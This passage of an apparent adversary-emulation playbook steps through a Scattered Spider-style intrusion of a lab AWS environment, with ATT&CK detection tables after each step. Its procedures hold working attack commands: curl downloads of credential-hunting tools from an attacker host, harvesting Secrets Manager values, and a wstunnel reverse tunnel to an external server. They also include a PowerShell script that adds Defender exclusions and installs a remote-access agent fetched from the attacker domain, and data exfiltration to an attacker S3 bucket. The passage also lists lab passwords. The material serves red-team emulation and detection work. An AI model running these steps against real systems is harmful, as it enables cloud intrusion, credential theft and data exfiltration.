      --tag-specifications '{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"goldroad"},{"Key":"Hostname","Value":"goldroad"}]}' \
      --metadata-options '{"HttpEndpoint":"enabled","HttpPutResponseHopLimit":2,"HttpTokens":"required"}' \
      --private-dns-name-options '{"HostnameType":"ip-name","EnableResourceNameDnsARecord":true,"EnableResourceNameDnsAAAARecord":false}' \
      --count "1" --key-name "goldroad" --user-data "$user_data" --iam-instance-profile '{"Name":"goldroad-role"}');
  echo $result | jq;
  ```

  - ***Expected Output***

    ```text
    {
      "ReservationId": "...",
      "OwnerId": "...",
      "Groups": [],
      "Instances": [
        {
          "Architecture": "x86_64",
          "BlockDeviceMappings": [],
          "ClientToken": "...",
          "EbsOptimized": false,
          "EnaSupport": true,
          "Hypervisor": "xen",
          "IamInstanceProfile": {
            "Arn": "arn:aws:iam::...:instance-profile/goldroad-role",
            "Id": "..."
          },
          "NetworkInterfaces": [
            {
              "Attachment": {
                "AttachTime": "...",
                "AttachmentId": "...",
                "DeleteOnTermination": true,
                "DeviceIndex": 0,
                "Status": "attaching",
                "NetworkCardIndex": 0
              },
              "Description": "",
              "Groups": [
                {
                  "GroupId": "...",
                  "GroupName": "goldroad-sg"
                }
              ],
              "Ipv6Addresses": [],
              "MacAddress": "...",
              "NetworkInterfaceId": "...",
              "OwnerId": "...",
              "PrivateDnsName": "...",
              "PrivateIpAddress": "...",
              "PrivateIpAddresses": [
                {
                  "Primary": true,
                  "PrivateDnsName": "...",
                  "PrivateIpAddress": "..."
                }
              ],
              "SourceDestCheck": true,
              "Status": "in-use",
              "SubnetId": "...",
              "VpcId": "...",
              "InterfaceType": "interface"
            }
          ],
          "RootDeviceName": "/dev/sda1",
          "RootDeviceType": "ebs",
          "SecurityGroups": [
            {
              "GroupId": "...",
              "GroupName": "goldroad-sg"
            }
          ],
          "SourceDestCheck": true,
          "StateReason": {
            "Code": "pending",
            "Message": "pending"
          },
          "Tags": [
            {
              "Key": "Hostname",
              "Value": "goldroad"
            },
            {
              "Key": "Name",
              "Value": "goldroad"
            }
          ],
          "VirtualizationType": "hvm",
          "CpuOptions": {
            "CoreCount": 1,
            "ThreadsPerCore": 2
          },
          "CapacityReservationSpecification": {
            "CapacityReservationPreference": "open"
          },
          "MetadataOptions": {
            "State": "pending",
            "HttpTokens": "required",
            "HttpPutResponseHopLimit": 2,
            "HttpEndpoint": "enabled",
            "HttpProtocolIpv6": "disabled",
            "InstanceMetadataTags": "disabled"
          },
          "EnclaveOptions": {
            "Enabled": false
          },
          "BootMode": "uefi-preferred",
          "PrivateDnsNameOptions": {
            "HostnameType": "ip-name",
            "EnableResourceNameDnsARecord": true,
            "EnableResourceNameDnsAAAARecord": false
          },
          "MaintenanceOptions": {
            "AutoRecovery": "default"
          },
          "CurrentInstanceBootMode": "uefi",
          "InstanceId": "...",
          "ImageId": "ami-0ea3c35c5c3284d82",
          "State": {
            "Code": 0,
            "Name": "pending"
          },
          "PrivateDnsName": "...",
          "PublicDnsName": "",
          "StateTransitionReason": "",
          "AmiLaunchIndex": 0,
          "ProductCodes": [],
          "InstanceType": "t3.large",
          "LaunchTime": "...",
          "Placement": {
            "GroupName": "",
            "Tenancy": "default",
            "AvailabilityZone": "..."
          },
          "Monitoring": {
            "State": "disabled"
          },
          "SubnetId": "...",
          "VpcId": "...",
          "PrivateIpAddress": "..."
        }
      ]
    }
    ```

- ☣️ Search for "EC2", and right-click to open the "EC2" console in a new tab.
Under "Instances" click on "Instances" and verify that the newly created
instance appears and is in the Running state.

- ☣️ In the AWS EC2 console, select the newly created instance, select "Connect",
select "EC2 Serial Console", in the "not authorized message" click "Manage
access", check Allow and click "Update". Under "Instances" click on "Instances",
select the newly created instance, and repeat the prior steps. Instead of the
"not authorized message", you should now be able to click the "Connect" button.
After connecting, if the console screen remains black, press Enter to load the
command prompt. Log in using the following credentials:

  | Destination | Username | Password
  |  - | - | -
  | `goldroad` | ahightower | Stable-Squash

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1136.003 | Create Account: Cloud Account | IaaS | tlannister created ahightower | Calibrated - Not Benign | Scattered Spider creates a new IAM user | dragongate (10.55.3.104) | tlannister | - | [9]
| Defense Evasion | T1036.010 | Masquerading: Masquerade Account Name | IaaS | ahightower was created with similar naming conventions to other existing accounts | Calibrated - Not Benign | Scattered Spider IAM user matches the victim environment naming convention | dragongate (10.55.3.104) | tlannister | - | [9]
| Persistence | T1098.001 | Account Manipulation: Additional Cloud Credentials | IaaS | tlannister creates ahightower access keys | Calibrated - Not Benign | Scattered Spider adds access keys to the new IAM user | dragongate (10.55.3.104) | tlannister | - | [9]
| Persistence | T1098.001 | Account Manipulation: Additional Cloud Credentials | IaaS | ahightower successfully logs in to AWS Console through a federated login URL | Calibrated - Not Benign | Scattered Spider uses the newly created IAM user to access the AWS account | - | ahightower | - | [9]
| Credential Access | T1606 | Forge Web Credentials | IaaS | ahightower queried GetFederationToken to forge a browser session URL | Calibrated - Not Benign | Scattered Spider queries sts:GetFederationToken using the new IAM users AWS secret to forge a browser session URL | - | ahightower | [aws_consoler](../Resources/aws_consoler/aws_consoler/cli.py#L81) | [9]
| Execution | T1059.009 | Command and Scripting Interpreter: Cloud API | IaaS | ahightower with federated admin access executed cloud shell | Calibrated - Not Benign | Scattered Spider uses AWS CloudShell | - | ahightower | - | [9]
| Persistence | T1098.003 | Account Manipulation: Additional Cloud Roles | IaaS | ahightower with federated admin access created a admin role and instance profile named `goldroad-role` | Calibrated - Not Benign | Scattered Spider creates an admin IAM role and associated instance profile to attach to EC2 instances. | - | ahightower | - | [9]
| Persistence | T1098.001 | Account Manipulation: Additional Cloud Credentials | IaaS | ahightower with federated admin access created a SSH key pair named `goldroad` | Calibrated - Not Benign | Scattered Spider creates an SSH key pair for accessing EC2 instances. | - | ahightower | - | [9]
| Defense Evasion | T1578.002 | Modify Cloud Compute Infrastructure: Create Cloud Instance | IaaS | ahightower with federated admin access launched the `goldroad` EC2 instance | Calibrated - Not Benign | Scattered Spider creates an EC2 instance | - | ahightower | - | [1], [9]
| Persistence | T1098.003 | Account Manipulation: Additional Cloud Roles | IaaS | ahightower with federated admin access configured the goldroad instance with the `goldroad-role` admin role and profile | Calibrated - Not Benign | Scattered Spider configures the EC2 instance with the administrator IAM role and associated instance profile | - | ahightower | - | [9]
| Lateral Movement | T1021.008 | Remote Services: Direct Cloud VM Connections | IaaS | ahightower successfully connected to goldroad EC2 instance through EC2 Serial Console | Calibrated - Not Benign | Scattered Spider uses EC2 Serial Console to access the newly created EC2 instance | - | ahightower | - | [9], [7]

## Step 5 - Credential Access

### Voice Track

After Scattered Spider has performed persistence and defense evasion, Scattered Spider enumerates
the victim company's AWS secrets via AWS CloudShell. Scattered Spider discovers a GitLab
personal access token enumerating the victim company's AWS secrets that will
later be used to authenticate to the victim's GitLab with `Trufflehog`. Scattered Spider
then attempts to harvest additional credentials by downloading and executing
`Trufflehog` to search for credentials stored in the victim company's GitLab,
and `Jecretz` to search for credentials stored in the victim company's Wekan.
Executing `Trufflehog` discovers an SSH key that the adversary will later use to
authenticate to the Linux machine hosting AirByte. Executing `Jecretz` discovers
the credentials to login to AirByte.

### Procedures

- ☣️ In the AWS console, return to the "CloudShell" terminal and enumerate the
available secrets

  ```bash
  aws secretsmanager list-secrets
  ```

- ☣️ In the CloudShell terminal, enumerate the values for available secrets.
Confirm the discovery of a GitLab personal access token (`glpat-XXXXXX...`).
Record this token for later use.

  ```bash
  aws secretsmanager batch-get-secret-value --secret-id-list gitlab-pat-atargaryen
  ```

- ☣️ Return to the EC2 Serial Console session to the created Linux instance. In
the EC2 Serial Console, execute curl to download Trufflehog.

  ```bash
  curl http://kingslanding-rmm.com/files/trufflehog -o trufflehog

  ```

- ☣️ In the EC2 Serial Console, elevate to sudo:

  ```bash
  sudo su
  ```

- ☣️ In the EC2 Serial Console, add the `kingslanding` domain certificate:

  ```bash
  echo | openssl s_client -connect gitlab.kingslanding.net:443 2>/dev/null | openssl x509 > /usr/local/share/ca-certificates/gitlab.crt
  ```

- ☣️ In the EC2 Serial Console, update the EC2 instance certificate store to trust
the domain certificate. Ignore the rehash: warning

  ```bash
  update-ca-certificates
  ```

  - ***Expected Output***

    ```text
    Updating certificates in /etc/ssl/certs...
    1 added, 0 removed; done.
    ```

- ☣️ In the EC2 Serial Console, execute Trufflehog against the GitLab using the
GitLab private access token previously discovered. Confirm the discovery of the
SSH key and save the contents to `/opt/kalidev/id_rsa`.

  ```bash
  chmod +x trufflehog;./trufflehog gitlab --endpoint=https://gitlab.kingslanding.net/ --token=<discovered gitlab access token>
  ```

  - ***Expected Output***

    ```text
    trufflehog output
    ```

- ☣️ In the EC2 Serial Console, add the universe apt repository

  ```bash
  sudo add-apt-repository universe
  ```

- ☣️ In the EC2 Serial Console, update apt

  ```bash
  sudo apt update
  ```

- ☣️ In the EC2 Serial Console, install pip and python virtual environments, then
create and activate the virtual environment

  ```bash
  sudo apt install python3-pip python3.12-venv -y && python3 -m venv .venv && source .venv/bin/activate
  ```

- ☣️ In the EC2 Serial Console, pip install Jecretz dependencies

  ```bash
  pip install certifi==2020.4.5.1 chardet==5.2.0 idna==2.9 requests==2.30.0 terminaltables==3.1.0 textwrap3==0.9.2 truffleHogRegexes==0.0.7 urllib3==2.0.7 --break-system-packages
  ```

- ☣️ In the EC2 Serial Console, execute curl to download Jecretz

  ```bash
  curl http://kingslanding-rmm.com/files/jecretz/jecretz.py -o jecretz.py
  ```

- ☣️ In the EC2 Serial Console, execute Jecretz against the Wekan. Ensure that
AirByte login credentials, client ID, and client secret are included in the
Jecretz output.

  ```bash
  python jecretz.py -w "http://wekan.kingslanding.net/" --username tlannister --password Engine-Dropkick -v
  ```

  - ***Expected Output***

    ```text
    jecretz output
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Credential Access | T1555.006 | Credentials from Password Stores: Cloud Secrets Management Stores | IaaS | ahightower enumerated secrets from AWS Secrets Manager | Calibrated - Not Benign | Scattered Spider lists secrets from AWS Secrets Manager | - | ahightower | - | [9], [13]
| Credential Access | T1555.006 | Credentials from Password Stores: Cloud Secrets Management Stores | IaaS | ahightower enumerated secret values from AWS Secrets Manager | Calibrated - Not Benign | Scattered Spider lists secret values from AWS Secrets Manager | - | ahightower | - | [9], [13]
| Command and Control | T1105 | Ingress Tool Transfer | Linux | /bin/bash executed curl to create truffleog | Calibrated - Not Benign | Scattered Spider downloads Trufflehog | goldroad (10.212.3.108) | ahightower | [trufflehog](../Resources/trufflehog) | [7], [8]
| Collection | T1213.003 | Data from Information Repositories: Code Repositories | Linux | /bin/bash executed trufflehog against <https://gitlab.kingslanding.net/> | Not Calibrated - Not Benign | Scattered Spider executes Trufflehog against the GitLab | goldroad (10.212.3.108), guildhall (10.212.3.106) | ahightower | [trufflehog](../Resources/trufflehog) | [7], [8]
| Command and Control | T1105 | Ingress Tool Transfer | Linux | /bin/bash executed curl to create jecretz.py | Calibrated - Not Benign | Scattered Spider downloads Jecretz | goldroad (10.212.3.108) | ahightower | [jecretz](../Resources/jecretz) | [7], [8]
| Defense Evasion | T1078 | Valid Accounts | Linux | tlannister successfully authenticated to <http://wekan.kingslanding.net/> | Calibrated - Not Benign | Scattered Spider authenticates to Wekan as `tlannister` | driftmark (174.3.0.70), dragonpit (10.212.3.105) | - | - | [7]
| Credential Access | T1552 | Unsecured Credentials | Linux | /bin/bash executed jecretz.py against <http://wekan.kingslanding.net/> | Not Calibrated - Not Benign | Scattered Spider executes Jecretz against Wekan | goldroad (10.212.3.108), dragonpit (10.212.3.105) | ahightower | [jecretz](../Resources/jecretz) | [8]

## Step 6 - Lateral Movement

### Voice Track

After performing credential access, Scattered Spider downloads `wstunnel` from GitHub
then executes the `wstunnel` client to tunnel SSH traffic from the adversary's
`wstunnel` server through the created EC2 instance to `rookery (10.212.3.107)`,
the Linux machine hosting AirByte. Scattered Spider then uses the tunnel to initiate an
SSH connection to `rookery (10.212.3.107)` and executes commands to confirm
AirByte is running and confirm the login credentials for AirByte. Then, Scattered Spider
returns to using the AWS Systems Manager console to download and install
Tactical RMM, a remote management tool, on all available hosts. The adversary
then creates a Tactical RMM session to connect to `fishmonger (10.55.4.102)` for
lateral movement.

### Procedures

- ☣️ From the EC2 Serial Console connection to the newly created EC2 instance,
download and execute the `wstunnel` client to create a tunnel

  ```bash
  curl -L https://github.com/erebe/wstunnel/releases/download/v10.1.8/wstunnel_10.1.8_linux_amd64.tar.gz -o wstunnel_10.1.8_linux_amd64.tar.gz;tar -xzf wstunnel_10.1.8_linux_amd64.tar.gz;chmod +x wstunnel;./wstunnel client -R tcp://12.78.0.94:2222:10.212.3.107:22 wss://12.78.0.94:443
  ```

- ☣️ Return to the Kali attack host `driftmark (174.3.0.70)` and initiate an SSH
connection to the `wstunnel` server using the SSH key discovered in the last step.

  | Password
  |  -
  | Barbed-Directive

  ```bash
  sudo ssh -i /opt/kalidev/id_rsa -p 2222 atargaryen@12.78.0.94
  ```

- ☣️ In the SSH session to `rookery (10.212.3.107)`, run the following commands to
verify that AirByte commandline is installed, AirByte is running, and to verify
the AirByte port and login credentials. Verify that the login email matches
`tlannister@kingslanding.net` and that the password matches
`5325OLZ9vcruy8H55qqhhmxK9xH7ooGb`

  ```bash
  abctl version
  sudo abctl local status
  sudo abctl local credentials
  ```

  - ***Expected Output***

    ```text
    version: v0.18.1

    Using Kubernetes provider:
      Provider: kind
      Kubeconfig: /root/.airbyte/abctl/abctl.kubeconfig
      Context: kind-airbyte-abctl
    Found Docker installation: version 26.1.5+dfsg1
    Existing cluster 'airbyte-abctl' found
    Found helm chart 'airbyte-abctl'
      Status: deployed
      Chart Version: 1.1.0
      App Version: 1.1.0
    Found helm chart 'ingress-nginx'
      Status: deployed
      Chart Version: 4.12.0-beta.0
      App Version: 1.12.0-beta.0
    Airbyte should be accessible via http://localhost:8000

    Using Kubernetes provider:
      Provider: kind
      Kubeconfig: /root/.airbyte/abctl/abctl.kubeconfig
      Context: kind-airbyte-abctl
    Retrieving your credentials from 'airbyte-auth-secrets'
    Credentials:
      Email: tlannister@kingslanding.net
      Password: 5325OLZ9vcruy8H55qqhhmxK9xH7ooGb
      Client-Id: 20f9d134-cd80-4e0a-9908-82f62fff0a82
      Client-Secret: a8W61gE13IVul618N2WKTHIGUs7Xmh0W
    ```

- ☣️ Return to the aws_consoler session, search for "Systems Manager", and
right-click to open "Systems Manager" in a new tab. In the navigation pane under
"Node Tools", click "Run Command", click the "Run command" button, select the
`AWS-RunPowerShellScript` command document and paste the following into the
"Commands" box:

  ```psh
  $hosts = "fleabottom", "fishmonger", "dragongate", "sept", "citadel"
  if ($hosts -contains $env:COMPUTERNAME) {
    mkdir "C:\Program Files\TacticalAgent"
    try {
        Add-MpPreference -ExclusionPath "C:\Program Files\TacticalAgent"
        Add-MpPreference -ExclusionPath "C:\Program Files\Mesh Agent"
        Add-MpPreference -ExclusionPath "C:\ProgramData\TacticalRMM"
    } catch {
        Write-Error "Error adding mpP paths: $_"
    } finally {
        curl.exe -o "C:\Program Files\TacticalAgent\tacticalrmm.exe" http://kingslanding-rmm.com/files/rmmagent.exe
        & "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.kingslanding-hr.com/ --client-id 1 --site-id 1 --agent-type workstation --auth REPLACE_WITH_AUTH_TOKEN --insecure
    }
    Write-Host "Attempted to run TacticalAgent on host"
  }
  ```

- ☣️ Replace the `REPLACE_WITH_AUTH_TOKEN` placeholder with the `--auth` token
that was noted during the scenario setup step.

- ☣️ Under "Target selection" select "Choose instances manually". Click into the
search bar, select "Platform Type" then select "Windows" and select all
remaining targets after filtering. Under "Output options" uncheck "Enable an S3
bucket" then click "Run". On the Command ID page, next to the "Cancel command"
button, click the arrow to refresh the status until the command has completed.
Scroll down and click the ID
for the target `fishmonger (10.55.4.102)` to also check the end of the
output.

- Return to the Windows jumpbox `jumpbox (12.78.110.37)` and create a new RDP
session to `fishmonger (10.55.4.102)` as the domain administrator `atargaryen`.
Leave the RDP session up (do not minimize the RDP Window) once reaching the
users desktop.

  | Destination | Username | Password
  |  - | - | -
  | fishmonger.kingslanding.net | kingslanding\atargaryen | Graph-Frozen

- ☣️ Switch to the TaticalRMM dashboard and connect to the Tactical RMM session on
the admin workstation `fishmonger (10.55.4.102)` by right clicking the agent and
selecting `Take Control`, pressing the `Connect` button in the new window, and
finally select the `Active, RDP-TCP#0 - kingslanding/atargaryen`.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Linux | /bin/bash executed curl to create wstunnel | Calibrated - Not Benign | Scattered Spider downloads wstunnel on created EC2 instance | goldroad (10.212.3.108) | ahightower | - | [7], [8]
| Command and Control | T1572 | Protocol Tunneling | Linux | /bin/bash executed wstunnel on 10.212.3.108, which executed a reverse proxy over WebSocket (port 443) to an external server 12.78.0.94. | Calibrated - Not Benign | Scattered Spider executes wstunnel client on created EC2 instance to establish SSH tunnel to rookery (10.212.3.107) | rookery (10.212.3.107) | ahightower | - | [7], [8]
| Command and Control | T1572 | Protocol Tunneling | Linux | Adversary connected to 10.212.3.107 over port 22 through 10.212.3.108 from a bidirectional tunnel | Calibrated - Not Benign | Scattered Spider connects to wstunnel and tunnels SSH through created EC2 instance to `rookery (10.212.3.107)` | rookery (10.212.3.107) | atargaryen | - | [7], [8]
| Lateral Movement | T1021.004 | Remote Services: SSH | Linux | atargaryen successfully logged into 10.212.3.107 from 10.212.3.108 through SSH  | Calibrated - Not Benign | Scattered Spider accesses AirByte host using SSH | rookery (10.212.3.107) | atargaryen | - | [7]
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Linux | atargaryen executed `abctl` through /bin | Calibrated - Not Benign | Scattered Spider uses the `abctl` command-line utility to verify AirByte details | rookery (10.212.3.107) | atargaryen | - | [4]
| Discovery | T1518 | Software Discovery | Linux | /bin executed `abctl local status` and `abctl local credentials` | Not Calibrated - Not Benign | Scattered Spider uses the `abctl` command-line utility to verify AirByte login port, status, and login credentials | rookery (10.212.3.107) | atargaryen | - | [4]
| Command and Control | T1105 | Ingress Tool Transfer | Windows, IaaS | ahightower created tacticalrmm.exe on hosts using AWS Systems Manager | Calibrated - Not Benign | Scattered Spider downloads Tactical RMM on all available hosts using AWS Systems Manager | citadel (10.55.3.103), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102) | nt authority\system, ahightower | [TacticalRMM](../Resources/rmmagent) | [2], [10]
| Command and Control | T1219 | Remote Access Software | Windows | powershell.exe installed tacticalrmm.exe on all hosts | Calibrated - Not Benign | Scattered Spider installs Tactical RMM on all available hosts using AWS Systems Manager | redkeep (10.55.3.100), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102) | nt authority\system | [TacticalRMM](../Resources/rmmagent) | [2], [8]
| Lateral Movement | T1021 | Remote Services | Windows | tacticalrmm.exe executed a backdoor (meshagent.exe) and connects to <https://api.kingslanding-hr.com/> on fishmonger then successfully remote accessed into fishmonger as atargaryen from 174.3.0.70  | Not Calibrated - Not Benign | Scattered Spider accesses remote host using Tactical RMM | fishmonger (10.55.4.102) | atargaryen | [TacticalRMM](../Resources/rmmagent) | [10], [13]

## Step 7 - Collection and Exfil

### Voice Track

Scattered Spider then uses the previously established Tactical RMM session to `fishmonger
(10.55.4.102)` to log into AirByte via the browser and make the necessary
configuration changes to redirect data flows to an adversary-controlled S3
bucket. Scattered Spider then uses a 3rd party tool to discover and exfiltrate files of
interest within victim S3 buckets.

### Procedures

- ☣️ In the Tactical RMM session to `fishmonger (10.55.4.102)`, open FireFox and
browse to the Airbyte portal, logging in with `tlannister@kingslanding.net`
credentials.

  | Destination | Username | Password
  |  - | - | -
  | `http://rookery.kingslanding.net` | <tlannister@kingslanding.net> | 5325OLZ9vcruy8H55qqhhmxK9xH7ooGb

- ☣️ Navigate to the "Destinations" tab and click "New Destination". Select "S3"
from the connectors list and set "Destination name" to `Weekly backup`.

- ☣️ Return to Kali and in a terminal, obtain the attacker S3 access and secret
access keys

- ☣️ In the bottom left corner of the TacticalRMM agent window, click to open the
Clipboard. Copy and paste the `Access key ID` obtained from the csv on the Kali
box. Set the "Access Key ID" field to the key by pasting from the clipboard.

- ☣️ Repeat the clipboard procedure for copying the `Secret access key` into the
"Secret Access Key" field.

- ☣️ Set "S3 bucket name" to `REPLACE_WITH_ATTACKER_S3_BUCKET_NAME`, "S3 Bucket Path" to
`databackup`, and "S3 Bucket Region" to `us-east-1`. Set "CSV" for the format to
store the data, then save the new S3 destination. Clicking "Set up destination"
will fire "Test the destination". After receiving "All Connections have passed",
you should automatically be redirected to your new connection "Weekly backup".

- ☣️ In the Airbyte portal, navigate to the "Connections" tab and click the "+ New
Connection" button. Choose "Select an existing source" and then select GitLab
from the pre-configured source list. On the "Define Destination" page, choose
"Select an existing destination" and then select the S3 destination named
"Weekly backup" that you created previously. Wait for AirByte to complete the
connection test and data scheme analysis.

- ☣️ For the "Select streams" page, check the box to select all schema objects and
**deselect** `epic_issues` and `epics` then click "Next". Change the connection
name to `Gitlab to S3`, select "manual" for sync frequency, and keep other
options as default. Click the "Set up connection" button and then start the sync
by clicking "sync now". Wait until sync completion, which may take a few
minutes.

- ☣️ Return to the "Connections" tab in the AirByte portal and click the "+ New
Connection" button. Choose "Select an existing source" and then select mongoDB
from the pre-configured source list. On the "Define Destination" page, choose
"Select an existing destination" and then select the S3 destination named
"Weekly backup" that you created previously. Wait for AirByte to complete the
connection test and data scheme analysis.

- ☣️ For the "Select streams" page, check the box to select all schema objects and
click "Next". Change the connection name to `Wekan to S3`, select "manual" for
sync frequency, and keep other options as default. Click the "Set up connection"
button and then start the sync by clicking "sync now". Wait until sync
completion, which may take a few minutes. A few of the fields may show "Queued
for next sync" which is ok.

- ☣️ In a new browser tab, navigate to and download Cyberduck. Open the Downloads
folder and double-click the CyberDuck installer, click "Run" if prompted. In
Cyberduck Setup window, click Install. Click close once the window shows
"Installation Successfully Completed"

  | Destination
  |  -
  | `https://update.cyberduck.io/windows/Cyberduck-Installer-9.1.7.43306.exe`

- ☣️ Search for and open Cyberduck then click on the Open Connection button in the
top left. From the dropdown box, select "Amazon S3" then for the Access Key ID
and Secret Access Keys, enter the access keys created in Step 4 for
`ahightower`. Click to drop down "More Options" and in "Path" enter
`REPLACE_WITH_VICTIM_S3_BUCKET_NAME`. Finally, click Connect.

- ☣️ Using Cyberduck, expand all of the directories to view the file contents then
collapse all directories when complete.

- ☣️ In Cyberduck, click File in the top left, and then click New Browser
(Ctrl-N). In the new browser window, click on the Open Connection button in the
top left. From the dropdown box, select Amazon S3.

- ☣️ Return to Kali and obtain the attacker S3 access and secret access keys.

- ☣️ Return to Cyberduck and enter the Access Key ID and Secret Access Keys. Click
to drop down "More Options" and in "Path" enter `REPLACE_WITH_ATTACKER_S3_BUCKET_NAME`.
Finally, click Connect at the bottom right.

- ☣️ Return to the browser with the victim s3 bucket, CTRL+A to highlight all of
the files in the bucket. Drag the highlighted files from the victim S3 bucket
and drop them to the adversary S3 bucket. Wait for the Transfers window to
appear then close when status shows "Copy complete". If files don't appear
immediately in the destination bucket, click the Refresh button to confirm files
have transfered successfully.

- ☣️ In the Tactical RMM session, use Cyberduck to upload all files in the network
file share to the attacker S3 bucket by clicking "Upload" and navigating to the
mounted file share then selecting all available files

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1213 | Data from Information Repositories | SaaS | Adversary configures 10.212.3.106 as a new connection with a destination of databackup/ in <http://rookery.kingslanding.net> | Not Calibrated - Not Benign | Scattered Spider uses Airbyte to exfiltrate GitLab data | fishmonger (10.55.4.102), rookery (10.212.3.107), guildhall (10.212.3.106) | atargaryen | - | [7], [13]
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Windows, Linux | Adversary uploads files to REPLACE_WITH_ATTACKER_S3_BUCKET_NAME/databackup/  | Calibrated - Not Benign | Scattered Spider exfiltrates GitLab data to attacker S3 bucket | fishmonger (10.55.4.102), rookery (10.212.3.107), guildhall (10.212.3.106) | atargaryen | - | [7], [13]
| Collection | T1213 | Data from Information Repositories | Windows, Linux, IaaS, SaaS | Adversary configures 10.212.3.105 as a new connection with a destination of databack/ in <http://rookery.kingslanding.net> | Calibrated - Not Benign | Scattered Spider uses Airbyte to exfiltrate Wekan data | fishmonger (10.55.4.102), rookery (10.212.3.107), dragonpit (10.212.3.105) | atargaryen | - | [8], [7], [13]
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Windows, Linux | Adversary uploads files to REPLACE_WITH_ATTACKER_S3_BUCKET_NAME/databackup/ | Calibrated - Not Benign | Scattered Spider exfiltrates Wekan data to attacker S3 bucket | fishmonger (10.55.4.102), rookery (10.212.3.107), dragonpit (10.212.3.105) | atargaryen | - | [8], [7], [13]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | firefox.exe downloads and installs `cyberduck` from `cyberduck.io` | Calibrated - Not Benign | Scattered Spider downloads and installs Cyberduck | fishmonger (10.55.4.102) | atargaryen | - | [9], [10]
| Defense Evasion | T1078.004 | Valid Accounts: Cloud Accounts | Windows, IaaS | atargaryen successfully authenticates to AWS as ahightower | Calibrated - Not Benign | Scattered Spider authenticates with AWS Access Key for S3 | fishmonger (10.55.4.102) | atargaryen | - | [9]
| Discovery | T1619 | Cloud Storage Object Discovery | IaaS | ahightower list objects, get bucket locations, and get bucket encryption in AWS Console | Calibrated - Not Benign | Scattered Spider discovers infrastructure files stored within S3 | fishmonger (10.55.4.102) | atargaryen | - | [9], [10]
| Exfiltration | T1537 | Transfer Data to Cloud Account | IaaS | ahightower uses `cyberduck` to transfer files from REPLACE_WITH_VICTIM_S3_BUCKET_NAME to REPLACE_WITH_ATTACKER_S3_BUCKET_NAME | Calibrated - Not Benign | Scattered Spider uses Cyberduck to transfer files in victim S3 bucket to attacker S3 bucket | fishmonger (10.55.4.102) | atargaryen | - | [7], [13]
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Windows | ahightower exfils the files to REPLACE_WITH_ATTACKER_S3_BUCKET_NAME | Calibrated - Not Benign | Scattered Spider exfiltrates victim data to the attacker S3 bucket | fishmonger (10.55.4.102), citadel (10.55.3.103) | atargaryen | - | [8]

## End of Scenario

### Voice Track

Perform the following steps to cleanup the Scattered Spider scenario.

### Procedures

- On the Windows jumpbox `jumpbox (12.78.110.37)`, sign out of your RDP session to the domain controller `redkeep (10.55.3.100)`
and any other RDP sessions that might be open.
Close all windows and sign out of
the jumpbox.

- From Kali, navigate to the terminal running the C2 server and terminate it via
'ctrl+c'.

- Close all terminal tabs via the 'exit' command. Then sign out of Kali
